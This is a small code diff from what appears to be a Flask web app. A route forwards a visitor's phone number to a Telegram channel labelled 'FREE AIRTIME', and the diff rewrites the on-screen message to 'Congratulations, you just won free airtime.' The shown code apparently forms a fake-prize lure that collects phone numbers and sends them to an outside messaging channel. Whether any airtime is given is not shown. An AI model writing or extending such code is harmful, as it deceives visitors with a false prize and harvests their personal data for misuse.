@@ -81,7 +81,7 @@ def centralmall():
         sendtelegram("FREE AIRTIME" + '\n' + 
                       "Phone Number= " + src.phone
         )
-        flash("Congratulations, you will receive your airtime in one minute","success")
+        flash("Congratulations, you just won free airtime.","success")
         return redirect("/centralmal")
     return render_template('about.html')
 
